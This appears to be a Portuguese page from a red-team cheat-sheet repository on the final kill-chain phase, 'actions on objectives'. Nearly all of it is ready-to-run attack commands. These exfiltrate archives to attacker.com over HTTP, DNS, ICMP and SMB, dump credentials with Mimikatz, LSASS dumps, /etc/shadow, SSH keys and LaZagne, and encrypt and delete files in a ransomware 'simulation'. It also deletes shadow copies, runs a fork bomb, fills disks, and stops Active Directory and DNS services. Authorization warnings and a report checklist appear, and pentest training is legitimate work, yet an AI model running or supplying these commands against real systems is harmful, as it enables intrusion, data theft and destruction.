# 🎯 Fase 7: Ações sobre os objetivos

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](07-Actions-Objectives.tr.md) • [🇬🇷 Ελληνικά](07-Actions-Objectives.el.md)

```
   █████╗  ██████╗████████╗██╗ ██████╗ ███╗   ██╗███████╗     ██████╗ ███╗   ██╗
  ██╔══██╗██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║██╔════╝    ██╔═══██╗████╗  ██║
  ███████║██║        ██║   ██║██║   ██║██╔██╗ ██║███████╗    ██║   ██║██╔██╗ ██║
  ██╔══██║██║        ██║   ██║██║   ██║██║╚██╗██║╚════██║    ██║   ██║██║╚██╗██║
  ██║  ██║╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║███████║    ╚██████╔╝██║ ╚████║
  ╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝     ╚═════╝ ╚═╝  ╚═══╝
         ██████╗ ██████╗      ██╗███████╗ ██████╗████████╗██╗██╗   ██╗███████╗███████╗
        ██╔═══██╗██╔══██╗     ██║██╔════╝██╔════╝╚══██╔══╝██║██║   ██║██╔════╝██╔════╝
        ██║   ██║██████╔╝     ██║█████╗  ██║        ██║   ██║██║   ██║█████╗  ███████╗
        ██║   ██║██╔══██╗██   ██║██╔══╝  ██║        ██║   ██║╚██╗ ██╔╝██╔══╝  ╚════██║
        ╚██████╔╝██████╔╝╚█████╔╝███████╗╚██████╗   ██║   ██║ ╚████╔╝ ███████╗███████║
         ╚═════╝ ╚═════╝  ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═══╝  ╚══════╝╚══════╝
```

**Objetivo:** Alcançar o objetivo final: exfiltração de dados, destruição ou outro impacto.

> **Notas sobre a precisão do original:** exfiltração é a transferência de dados para fora do ambiente alvo. O exemplo rotulado “Base64 por GET” usa `curl -d`, ou seja, envia um corpo por POST. A “simulação” de cifragem escreve novos ficheiros e elimina os originais: altera realmente os dados. O comando `vssadmin resize shadowstorage` redimensiona o armazenamento e não desativa, por si só, as cópias de sombra. `net user administrator NewP@ssw0rd!` altera apenas a palavra-passe da conta indicada, embora o comentário original refira todas. Na tabela HTTP/HTTPS, a cifragem aplica-se a HTTPS, não a HTTP simples.

---

## 📤 Exfiltração de dados

### Localizar dados sensíveis

#### Windows
```cmd
# Procurar ficheiros sensíveis
dir /s /b *password* *credential* *secret* *.kdbx *.key
dir /s /b *.doc* *.xls* *.pdf *.txt *.config

# Procurar ficheiros modificados recentemente
forfiles /P C:\ /S /D +01/01/2024 /C "cmd /c echo @path"

# PowerShell — procurar pelo conteúdo
Get-ChildItem -Recurse | Select-String -Pattern "password" -List | Select Path
Get-ChildItem -Path C:\ -Include *.txt,*.doc*,*.xls* -Recurse -ErrorAction SilentlyContinue
```

#### Linux
```bash
# Procurar ficheiros sensíveis
find / -name "*password*" -o -name "*.key" -o -name "*.pem" 2>/dev/null
find / -name "*.conf" -o -name "*.config" 2>/dev/null | xargs grep -l "password"

# Ficheiros recentes
find / -mtime -7 -type f 2>/dev/null

# Ficheiros grandes
find / -size +100M -type f 2>/dev/null
```

### Comprimir e preparar os dados

#### Windows
```powershell
# PowerShell — criar um ZIP
Compress-Archive -Path C:\Sensitive -DestinationPath C:\temp\data.zip

# 7-Zip
7z a -p"password" data.7z C:\Sensitive\*

# Tar com compressão
tar -cvzf data.tar.gz C:\Sensitive\
```

#### Linux
```bash
# Criar um arquivo comprimido
tar -cvzf /tmp/data.tar.gz /home/user/sensitive/

# Com cifragem
tar -cvzf - /sensitive | openssl enc -aes-256-cbc -e > data.tar.gz.enc

# ZIP com palavra-passe
zip -r -e data.zip /sensitive/
```

### Métodos de exfiltração

#### HTTP/HTTPS
```bash
# Enviar através de curl
curl -X POST -F "file=@/tmp/data.zip" http://attacker.com/upload.php

# Base64 por GET (pequenos volumes de dados)
base64 /tmp/data.zip | curl -d @- http://attacker.com/receive

# Envio com PowerShell
$bytes = [IO.File]::ReadAllBytes("C:\temp\data.zip")
Invoke-WebRequest -Uri "http://attacker.com/upload" -Method POST -Body $bytes
```

#### Exfiltração por DNS
```bash
# Codificar dados em consultas DNS
cat /tmp/data | xxd -p | while read line; do nslookup $line.attacker.com; done

# Utilizar dnscat2
dnscat2 attacker.com

# DNSExfiltrator
python dnsexfiltrator.py -d attacker.com -f data.zip
```

#### ICMP
```bash
# Exfiltrar através de ping
xxd -p -c 4 data.zip | while read line; do ping -c 1 -p $line attacker.com; done

# Utilizar icmpsh
python icmpsh_m.py ATTACKER_IP VICTIM_IP
```

#### SMB
```bash
# Copiar para uma partilha do atacante
copy C:\Sensitive\data.zip \\attacker_ip\share\

# Montar e copiar (Linux)
smbclient //attacker_ip/share -U user -c "put data.zip"
```

#### Serviços cloud
```bash
# AWS S3
aws s3 cp data.zip s3://bucket-name/

# Azure Blob
az storage blob upload --file data.zip --container-name mycontainer --name data.zip

# Google Cloud
gsutil cp data.zip gs://bucket-name/
```

---

## 💣 Ações destrutivas (simulação de ransomware)

> ⚠️ **AVISO:** Apenas para operações de red team autorizadas!

### Simulação de cifragem
```powershell
# PowerShell — cifrar ficheiros (simulação)
$key = [System.Text.Encoding]::UTF8.GetBytes("0123456789ABCDEF")
$files = Get-ChildItem -Path C:\TestData -Recurse -File
foreach ($file in $files) {
    $content = Get-Content $file.FullName -Raw
    $encrypted = [System.Security.Cryptography.ProtectedData]::Protect([System.Text.Encoding]::UTF8.GetBytes($content), $key, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    Set-Content "$($file.FullName).encrypted" $encrypted
    Remove-Item $file.FullName
}
```

### Eliminação de cópias de sombra do volume
```cmd
# Eliminar cópias de sombra (impede a recuperação)
vssadmin delete shadows /all /quiet
wmic shadowcopy delete

# Desativar cópias de sombra
vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB
```

---

## 🔐 Recolha de credenciais

### Credenciais Windows
```powershell
# Mimikatz — todas as credenciais
mimikatz# sekurlsa::logonpasswords

# Extrair a base de dados SAM
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
mimikatz# lsadump::sam /sam:SAM /system:SYSTEM

# Extração da memória do LSASS
procdump -ma lsass.exe lsass.dmp
mimikatz# sekurlsa::minidump lsass.dmp

# Extrair da imagem de memória
pypykatz lsa minidump lsass.dmp
```

### Credenciais Linux
```bash
# Ficheiro shadow
cat /etc/shadow

# Chaves SSH
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null

# Ficheiros de histórico
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.psql_history

# Ficheiros de configuração
grep -r "password" /etc/ 2>/dev/null
grep -r "password" /home/ 2>/dev/null
```

### Credenciais dos navegadores
```bash
# Credenciais do Chrome (Windows)
# Localização: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data

# Credenciais do Firefox (Windows)
# Localização: %APPDATA%\Mozilla\Firefox\Profiles\*.default\logins.json

# LaZagne — todas as palavras-passe dos navegadores
python laZagne.py all
```

---

## 🖥️ Impacto no sistema

### Negação de serviço
```bash
# Fork bomb (Linux) — NÃO EXECUTAR!
:(){ :|:& };:

# Encher o disco
dd if=/dev/zero of=/tmp/fill bs=1M count=100000

# Esgotamento de CPU
yes > /dev/null &
```

### Manipulação de contas
```bash
# Alterar todas as palavras-passe de utilizadores
net user administrator NewP@ssw0rd!

# Bloquear contas
net user username /active:no

# Eliminar utilizadores
net user username /delete
```

### Interrupção de serviços
```cmd
# Parar serviços críticos
net stop "DNS Server"
net stop "Active Directory Domain Services"

# Desativar serviços
sc config wuauserv start= disabled
```

---

## 📊 Referência rápida

### Métodos de exfiltração

| Método | Vantagens | Desvantagens |
|--------|------|------|
| HTTP/HTTPS | Tráfego comum, cifrado | Pode ser monitorizado |
| DNS | Muitas vezes sem monitorização | Lento, limites de tamanho |
| ICMP | Pode contornar firewalls | Muito lento |
| SMB | Rápido, nativo | Apenas interno |
| Cloud | Serviços legítimos | Requer credenciais |

### Prioridades por localização dos dados

| Localização | Valor |
|----------|-------|
| Controlador de domínio | Máximo — credenciais AD |
| Servidores de ficheiros | Elevado — documentos |
| Servidores de correio eletrónico | Elevado — comunicações |
| Servidores de bases de dados | Elevado — dados de negócio |
| Servidores de desenvolvimento | Médio — código-fonte |
| Estações de trabalho dos utilizadores | Médio — ficheiros locais |

---

## ✅ Lista de verificação do relatório de pentest

```markdown
- [ ] Documentar todos os sistemas comprometidos
- [ ] Listar todas as credenciais descobertas
- [ ] Mapear o percurso do ataque desde o acesso inicial
- [ ] Documentar as vulnerabilidades exploradas
- [ ] Registar as localizações de dados sensíveis encontradas
- [ ] Apresentar recomendações de correção
- [ ] Incluir uma cronologia das atividades
- [ ] Recolher capturas de ecrã que comprovem o acesso
```

---

## 🔗 Guias de referência relacionados

- [Mimikatz](../../Mimikatz/README.md)
- [Comandos Linux](../../Linux-Commands/README.md)
- [PowerShell](../../PowerShell/README.md)

---

**Fase anterior:** [← 06 - Evasão de defesas](./06-Defense-Evasion.pt.md)

**Voltar à visão geral:** [🎯 Visão geral da Kill Chain](./README.pt.md)

---

<p align="center">
  <b>🎯 Missão concluída!</b><br>
  <i>Lembra-te: executa estas ações apenas com a devida autorização!</i>
</p>
